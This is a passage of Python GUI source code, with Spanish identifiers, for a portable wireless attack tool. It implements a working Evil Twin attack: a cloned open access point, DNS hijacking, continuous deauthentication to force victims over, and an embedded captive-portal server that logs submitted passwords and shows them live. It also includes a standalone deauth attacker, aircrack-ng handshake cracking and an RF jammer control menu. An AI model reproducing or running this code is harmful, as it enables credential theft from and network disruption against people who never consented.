                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                    partes = f.read().split("Station MAC,")
                    for linea in partes[0].split("\n")[2:]:
                        r = linea.split(",")
                        if len(r) >= 14 and ":" in r[0]:
                            redes.append(
                                {"bssid": r[0].strip(), "ch": r[3].strip(),
                                 "essid": r[13].strip() or "<Oculta>"})
            except:
                pass
            finally:
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try:
                        os.remove(f"{scan_prefix}{ext}")
                    except:
                        pass
            self.after(0, lambda: self._evil_twin_mostrar_redes(redes))

        threading.Thread(target=escanear, daemon=True).start()
        self.escribir_consola("[*] Escaneando redes...")

    def _evil_twin_mostrar_redes(self, redes):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_evil_twin)
        ttk.Label(self.main_frame, text="RED OBJETIVO", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No hay redes.", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for red in redes:
            texto = f"{red['essid']} (CH:{red['ch']})"
            scroll.add_button(text=texto, command=lambda r=red: self._evil_twin_seleccionar_portal(r),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _evil_twin_seleccionar_portal(self, red):
        self.wifi_state["target"] = red
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_mostrar_redes([red]))
        ttk.Label(self.main_frame, text="PORTAL CAUTIVO", style='Title.TLabel').pack(pady=2)
        portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
        os.makedirs(portals_dir, exist_ok=True)
        portales = [d for d in os.listdir(portals_dir) if os.path.isdir(os.path.join(portals_dir, d))]
        if not portales:
            ttk.Label(self.main_frame, text="No hay portales.", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for portal in sorted(portales):
            if os.path.isfile(os.path.join(portals_dir, portal, "index.html")):
                scroll.add_button(text=portal, command=lambda p=portal: self._evil_twin_seleccionar_deauth_mode(red, p),
                                  style='Red.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _evil_twin_seleccionar_deauth_mode(self, red, portal):
        self.wifi_state["portal_name"] = portal
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_portal(red))
        ttk.Label(self.main_frame, text="MODO DEAUTH", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        scroll.add_button(text="Broadcast", command=lambda: self._evil_twin_ejecutar(red, portal, "broadcast"),
                          style='Danger.TButton', width=28)
        scroll.add_button(text="Dirigido", command=lambda: self._evil_twin_escanear_clientes(red, portal),
                          style='Red.TButton', width=28)
                          
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _evil_twin_escanear_clientes(self, red, portal):
        mon = self.wifi_state.get("mon_deauth")
        scan_prefix = self._generar_nombre_temporal("evil_clients")
        subprocess.run(
            f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]: clientes.append(c[0].strip())
        except:
            pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except:
                    pass

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_seleccionar_deauth_mode(red, portal))
        ttk.Label(self.main_frame, text="CLIENTES", style='Title.TLabel').pack(pady=2)
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for mac in clientes:
            scroll.add_button(text=mac,
                              command=lambda m=mac: self._evil_twin_ejecutar(red, portal, "directed", m),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        session_dir = os.path.abspath(os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}"))
        os.makedirs(session_dir, exist_ok=True)

        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="EVIL TWIN ACTIVO", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        # NUEVO BOTÓN
        self.btn_detener_evil = scroll.add_button(text="DETENER ATAQUE", command=self._evil_twin_detener_click,
                          style='Danger.TButton', width=28)
                          
        self.mostrar_consola(parent=scroll.scrollable_frame)

        self.evil_twin_stop = False

        def ataque():
            import shutil
            self._evil_twin_limpiar_procesos()
            ap_iface = self.wifi_state["ap_iface"]
            deauth_iface = self.wifi_state.get("deauth_iface")
            mon_deauth = self.wifi_state.get("mon_deauth")

            if not mon_deauth:
                subprocess.run(["sudo", "airmon-ng", "start", deauth_iface], stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
                mon_deauth = f"{deauth_iface}mon" if os.path.exists(
                    f"/sys/class/net/{deauth_iface}mon") else deauth_iface
                self.wifi_state["mon_deauth"] = mon_deauth

            # 1. Copia segura nativa de Python (Evita fallos silenciosos de Bash)
            portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
            os.makedirs(tmp_web, exist_ok=True)
            
            try:
                ruta_origen = os.path.join(portals_dir, portal)
                # Copia todo el contenido de la carpeta del portal a la carpeta temporal
                shutil.copytree(ruta_origen, tmp_web, dirs_exist_ok=True)
            except Exception as e:
                self.escribir_consola(f"[!] Aviso al copiar archivos: {e}")

            cred_log = os.path.abspath(os.path.join(session_dir, "credentials.log"))
            
            # 2. Servidor Web Multihilo y Blindado contra Bucles
            capture_script = f'''#!/usr/bin/env python3
import http.server, urllib.parse, os
from datetime import datetime

LOG = "{cred_log}"

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        
        # Captura por URL (GET) si es que el portal lo envía así
        if parsed_path.query:
            try:
                params = urllib.parse.parse_qs(parsed_path.query)
                with open(LOG, "a") as f: 
                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
                    f.flush(); os.fsync(f.fileno())
            except: pass

        # Interpretar la raíz "/" como "/index.html"
        if parsed_path.path == "/":
            self.path = "/index.html"
            
        local_path = self.translate_path(self.path)
        
        # Lógica de Redirección (Captive Portal Detector)
        if not os.path.isfile(local_path):
            # Prevención del bucle infinito si index.html no se copió correctamente
            if self.path == "/index.html":
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h2>Error de Servidor: El archivo index.html no existe.</h2></body></html>")
                return
                
            # Si piden algo distinto (ej. generate_204), redirigir al portal
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/index.html")
            self.end_headers()
            return
            
        return super().do_GET()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length).decode("utf-8", "ignore")
            params = urllib.parse.parse_qs(data)
            
            with open(LOG, "a") as f: 
                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
                f.flush(); os.fsync(f.fileno())
        except: pass
            
        self.send_response(302)
        self.send_header("Location", "http://10.0.0.1/success.html")
        self.end_headers()
        
    def log_message(self, format, *args): pass # Silencia logs para no saturar memoria

if __name__ == "__main__":
    os.chdir("{tmp_web}")
    # ThreadingHTTPServer atiende múltiples peticiones sin congelarse
    class ThreadedServer(http.server.ThreadingHTTPServer):
        allow_reuse_address = True
        
    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
        httpd.serve_forever()
'''
            with open(f"{tmp_web}/capture.py", "w") as f:
                f.write(capture_script)
                
            if not os.path.exists(f"{tmp_web}/success.html"):
                with open(f"{tmp_web}/success.html", "w") as f:
                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana.</p></body></html>')

            # 3. Configuración del Access Point
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
            
            with open("/tmp/hostapd_evil.conf", "w") as f:
                f.write(hostapd_conf)
                
            self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)

            # 4. Solución DHCP Raspberry Pi (Prevenir que NetworkManager borre la IP)
            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
            time.sleep(1.5) 

            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
            with open("/tmp/dnsmasq_evil.conf", "w") as f:
                f.write(dnsmasq_conf)
                
            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
            self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)

            # 5. Iptables limpio (Sin redirigir el puerto 443 para evitar crasheos del servidor Python)
            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
            subprocess.run(
                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT",
                 "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
            # Solo permitimos el tráfico necesario
            for port in ["80", "53"]:
                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
            for port in ["53", "67"]:
                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)

            # 6. Lanzar servidor web de captura en segundo plano
            self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

            # 7. Iniciar inyección de desautenticación si se configuró
            subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL,
                           stdout=subprocess.DEVNULL)
            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
            if deauth_mode == "directed" and cliente_mac:
                deauth_cmd.extend(["-c", cliente_mac])
            deauth_cmd.append(mon_deauth)
            self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL,
                                                              stderr=subprocess.DEVNULL)

            # 8. Bucle de monitoreo para mostrar credenciales en la interfaz de la Pi
            last_lines = 0
            while not self.evil_twin_stop:
                time.sleep(2)
                if os.path.exists(cred_log):
                    with open(cred_log, "r") as f:
                        lines = f.readlines()
                        if len(lines) > last_lines:
                            for line in lines[last_lines:]:
                                self.escribir_consola(f"[+] Cred: {line.strip()}")
                            last_lines = len(lines)

            # Cierre seguro al presionar "DETENER ATAQUE"
            self._evil_twin_detener_procesos()
            self._evil_twin_limpiar_iptables(ap_iface)
            
            # Restaurar Modo Monitor y NetworkManager
            mon_deauth = self.wifi_state.get("mon_deauth")
            if mon_deauth:
                subprocess.run(["sudo", "airmon-ng", "stop", mon_deauth], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.escribir_consola("[+] Evil Twin detenido y red restaurada.")
            self.after(0, self.show_wifi_menu)

        self.evil_twin_thread = threading.Thread(target=ataque, daemon=True)
        self.evil_twin_thread.start()

    # Reemplaza el antiguo _evil_twin_detener por este método:
    def _evil_twin_detener_click(self):
        if hasattr(self, 'btn_detener_evil') and self.btn_detener_evil.winfo_exists():
            self.btn_detener_evil.config(style='Gray.TButton')
            self.btn_detener_evil.state(['disabled'])
        self.escribir_consola("[*] Deteniendo procesos y restaurando red...")
        self.evil_twin_stop = True
    

    def _evil_twin_detener_procesos(self):
        for nombre, proc in self.evil_twin_procs.items():
            if proc is not None:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except:
                    proc.kill()
                self.evil_twin_procs[nombre] = None

    def _evil_twin_limpiar_procesos(self):
        self._evil_twin_detener_procesos()
        subprocess.run(["sudo", "pkill", "-f", "hostapd.*evil"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-f", "dnsmasq.*evil"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-f", "capture.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _evil_twin_limpiar_iptables(self, ap_iface):
        subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
        if ap_iface:
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
            
            # DEVOLVER CONTROL A NETWORKMANAGER
            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "yes"], stderr=subprocess.DEVNULL)
            
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)

    




    def _wifi_deauth(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="DEAUTH - IFace", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        self.deauth_iface_btns = []
        for iface in self.obtener_interfaces_red():
            btn = scroll.add_button(text=iface, command=lambda i=iface: self._deauth_escanear(i),
                              style='Red.TButton', width=28)
            if btn: self.deauth_iface_btns.append(btn)
                              
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _deauth_escanear(self, iface):
        for btn in getattr(self, 'deauth_iface_btns', []):
            if btn and btn.winfo_exists():
                btn.config(style='Gray.TButton')
                btn.state(['disabled'])

        self.wifi_state = {"iface": iface}
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
        self.wifi_state["mon_iface"] = mon
        scan_prefix = self._generar_nombre_temporal("deauth_scan")
        subprocess.run(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        redes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                for linea in f.read().split("\n")[2:]:
                    r = linea.split(",")
                    if len(r) >= 14 and ":" in r[0]:
                        redes.append(
                            {"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
        except:
            pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except:
                    pass
        self.after(0, lambda: self._deauth_mostrar_redes(redes))


    def _deauth_mostrar_redes(self, redes):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ttk.Label(self.main_frame, text="SELECCIONA RED", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No hay redes.", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for red in redes:
            texto = f"{red['essid']} (CH:{red['ch']})"
            scroll.add_button(text=texto, command=lambda r=red: self._deauth_seleccionar_modo(r),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _deauth_seleccionar_modo(self, red):
        self.wifi_state["target"] = red
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ttk.Label(self.main_frame, text="MODO DE ATAQUE", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        scroll.add_button(text="Broadcast (Todos)", command=lambda: self._deauth_ejecutar("FF:FF:FF:FF:FF:FF"),
                          style='Danger.TButton', width=28)
        scroll.add_button(text="Cliente específico", command=lambda: self._deauth_escanear_clientes(red),
                          style='Red.TButton', width=28)
                          
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _deauth_escanear_clientes(self, red):
        mon = self.wifi_state["mon_iface"]
        scan_prefix = self._generar_nombre_temporal("deauth_clients")
        subprocess.run(
            f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]: clientes.append(c[0].strip())
        except:
            pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try:
                    os.remove(f"{scan_prefix}{ext}")
                except:
                    pass
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
        ttk.Label(self.main_frame, text="SELECCIONA CLIENTE", style='Title.TLabel').pack(pady=2)
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for mac in clientes:
            scroll.add_button(text=mac, command=lambda m=mac: self._deauth_ejecutar(m),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _deauth_ejecutar(self, cliente):
        red = self.wifi_state["target"]
        mon = self.wifi_state["mon_iface"]
        subprocess.run(["sudo", "iw", "dev", mon, "set", "channel", red['ch']], stderr=subprocess.DEVNULL,
                    stdout=subprocess.DEVNULL)
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_deauth)
        ttk.Label(self.main_frame, text="INTENSIDAD", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        for texto, count in [("Continuo (0)", "0"), ("1 ráfaga (5)", "5"), ("3 ráfagas (15)", "15")]:
            # Redirigir al nuevo método con gestión del ataque
            scroll.add_button(text=texto, 
                            command=lambda r=red, c=cliente, cnt=count: self._deauth_ataque_activo(r, c, cnt),
                            style='Red.TButton', width=28)
                            
        self.mostrar_consola(parent=scroll.scrollable_frame)



    def _deauth_ataque_activo(self, red, cliente, count):
        mon = self.wifi_state["mon_iface"]
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._deauth_seleccionar_modo(red))
        ttk.Label(self.main_frame, text="DEAUTH EN CURSO", style='Title.TLabel').pack(pady=5)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        def detener():
            if hasattr(self, 'btn_detener_deauth') and self.btn_detener_deauth.winfo_exists():
                self.btn_detener_deauth.config(style='Gray.TButton')
                self.btn_detener_deauth.state(['disabled'])
                
            if self.deauth_proc is not None:
                try:
                    self.deauth_proc.terminate()
                    self.deauth_proc.wait(timeout=5)
                except:
                    self.deauth_proc.kill()
                self.deauth_proc = None
            
            self.escribir_consola("[+] Ataque deauth detenido. Restaurando red...")
            def restore():
                mon_iface = self.wifi_state.get("mon_iface")
                if mon_iface:
                    subprocess.run(["sudo", "airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.after(0, self.show_wifi_menu)
                
            threading.Thread(target=restore, daemon=True).start()
        
        self.btn_detener_deauth = scroll.add_button(text="DETENER DEAUTH", command=detener,
                        style='Danger.TButton', width=28)
        
        self.mostrar_consola(parent=scroll.scrollable_frame)
        
        cmd = ["sudo", "aireplay-ng", "--deauth", count, "-a", red['bssid'], "-c", cliente, mon]
        self.escribir_consola(f"\nroot@kali:~# {' '.join(cmd)}")
        
        def run_attack():
            self.deauth_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                                stderr=subprocess.STDOUT, text=True)
            for line in self.deauth_proc.stdout:
                self.escribir_consola(line.rstrip())
            self.deauth_proc.wait()
            self.escribir_consola("\n[+] Inyección finalizada. Presiona DETENER para salir.")
            self.deauth_proc = None
        
        threading.Thread(target=run_attack, daemon=True).start()



    def _wifi_explorar_handshakes(self):
        self._mostrar_explorador_generico(BASE_DIR_WIFI, "CAPTURAS", self.show_wifi_menu)

    def _wifi_explorar_evil(self):
        self._mostrar_explorador_generico(BASE_DIR_EVIL, "EVIL TWIN RES", self.show_wifi_menu)

    def _mostrar_explorador_generico(self, base_dir, titulo, callback_volver):
        self.limpiar_main_frame()
        self.agregar_boton_atras(callback_volver)
        ttk.Label(self.main_frame, text=titulo, style='Title.TLabel').pack(pady=2)
        if not os.path.exists(base_dir): os.makedirs(base_dir)
        carpetas = sorted([d for d in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, d))],
                          reverse=True)
        if not carpetas:
            ttk.Label(self.main_frame, text="No hay registros.", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for carpeta in carpetas:
            ruta = os.path.join(base_dir, carpeta)
            scroll.add_button(text=carpeta,
                              command=lambda r=ruta: self._mostrar_archivos_generico(r, callback_volver, base_dir),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _mostrar_archivos_generico(self, ruta, callback_volver, base_dir):
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._mostrar_explorador_generico(base_dir, "", callback_volver))
        nombre = os.path.basename(ruta)
        ttk.Label(self.main_frame, text=nombre, style='Title.TLabel').pack(pady=2)
        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
        if not archivos:
            ttk.Label(self.main_frame, text="Carpeta vacía", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for archivo in archivos:
            arch_path = os.path.join(ruta, archivo)
            if archivo.endswith('.cap'):
                cmd = f"aircrack-ng '{arch_path}'"
            else:
                cmd = f"cat '{arch_path}'"
            scroll.add_button(text=archivo, command=lambda c=cmd: self.ejecutar_comando(c),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    # ==========================================
    # MENÚ BLUETOOTH BLE
    # ==========================================
    def _ensure_gadget(self, force_reconnect=False):
        """Verifica o restablece la conexión aislando la UI de los hilos."""
        msg = None
        try:
            from gadget_handler import BLEGadget
            if self.gadget is None:
                self.gadget = BLEGadget()
            elif force_reconnect or not self.gadget.is_available():
                self.gadget.reconnect()
                
            self.gadget_available = self.gadget.is_available()
            if self.gadget_available:
                msg = "[+] Gadget NRF24 conectado y listo."
        except Exception as e:
            self.gadget = None
            self.gadget_available = False
            msg = f"[!] Error inicializando gadget: {e}"
            
        if msg:
            # Enviar mensaje a la consola de forma segura desde el hilo
            self.after(0, lambda m=msg: self.escribir_consola(m))
            
        return self.gadget_available

    def show_nrf_jammer_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="NRF24 JAMMER", style='Title.TLabel').pack(pady=2)
        
        loading_lbl = ttk.Label(self.main_frame, text="Detectando puerto USB...", style='Gray.TLabel')
        loading_lbl.pack(pady=20)

        def async_check():
            # Forzamos reconexión limpia cada vez que entramos al menú
            # Esto soluciona los problemas de hot-plugging.
            connected = self._ensure_gadget(force_reconnect=True)
            self.after(0, lambda: self._build_nrf_interface(connected, loading_lbl))

        threading.Thread(target=async_check, daemon=True).start()

    def _build_nrf_interface(self, connected, loading_lbl=None):
        if loading_lbl is not None and loading_lbl.winfo_exists():
            loading_lbl.destroy()

        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="NRF24 JAMMER", style='Title.TLabel').pack(pady=2)

        scroll_nrf = ScrollableFrame(self.main_frame, max_items=10)
        scroll_nrf.pack(fill='both', expand=True, padx=2, pady=2)

        status_txt = "Conectado" if connected else "Desconectado"
        status_clr = "#00ff00" if connected else "#ff4d4d"
        ttk.Label(scroll_nrf.scrollable_frame, text=f"Estado: {status_txt}",
                  foreground=status_clr, font=('Helvetica', 10, 'bold')).pack(pady=(2, 10))

        if connected:
            scroll_nrf.add_button(text="Activar Jamming", command=self._nrf_start, style='Red.TButton', width=28)
            scroll_nrf.add_button(text="Detener Jamming", command=self._nrf_stop, style='Danger.TButton', width=28)
            scroll_nrf.add_button(text="Consultar Estado", command=self._nrf_status, style='Gray.TButton', width=28)
            scroll_nrf.add_button(text="Reconectar / Reset", command=self._async_reconnect, style='Gray.TButton', width=28)
        else:
            ttk.Label(scroll_nrf.scrollable_frame, text="Conecta el ESP32 por USB.", style='Dark.TLabel').pack(pady=5)
            scroll_nrf.add_button(text="Buscar Dispositivo", command=self._async_reconnect, style='Red.TButton', width=28)

        self.mostrar_consola(parent=scroll_nrf.scrollable_frame)
        gc.collect()

    def _async_reconnect(self):
        """Maneja la reconexión forzando la limpieza del puerto serial previo."""
        self.escribir_consola("[*] Buscando dispositivo...")
        def do_reconnect():
            connected = self._ensure_gadget(force_reconnect=True)
            if not connected:
                self.after(0, lambda: self.escribir_consola("[!] No se detectó el hardware."))
            self.after(0, lambda: self._build_nrf_interface(connected, None))
            
        threading.Thread(target=do_reconnect, daemon=True).start()

    def _nrf_start(self):
        if self.gadget and self.gadget.is_available():
            self.escribir_consola("[*] Iniciando barrido RF continuo...")
            def run():
                try:
                    success = self.gadget.sweep_jam(0, 0)
                    if success:
                        self.after(0, lambda: self.escribir_consola("[+] Jamming activado."))
                    else:
                        self.after(0, lambda: self.escribir_consola("[!] Sin confirmación del Gadget."))
                except Exception as e:
                    self.after(0, lambda e=e: self.escribir_consola(f"[!] Error: {e}"))
            threading.Thread(target=run, daemon=True).start()
        else:
            self.escribir_consola("[!] Gadget desconectado. Pulsa 'Buscar'.")

    def _nrf_stop(self):
        if self.gadget and self.gadget.is_available():
            self.escribir_consola("[*] Deteniendo transmisiones...")
            def run():
                try:
                    self.gadget.stop(0)
                    self.after(0, lambda: self.escribir_consola("[+] Transmisión detenida."))
                except Exception as e:
                    self.after(0, lambda e=e: self.escribir_consola(f"[!] Error: {e}"))
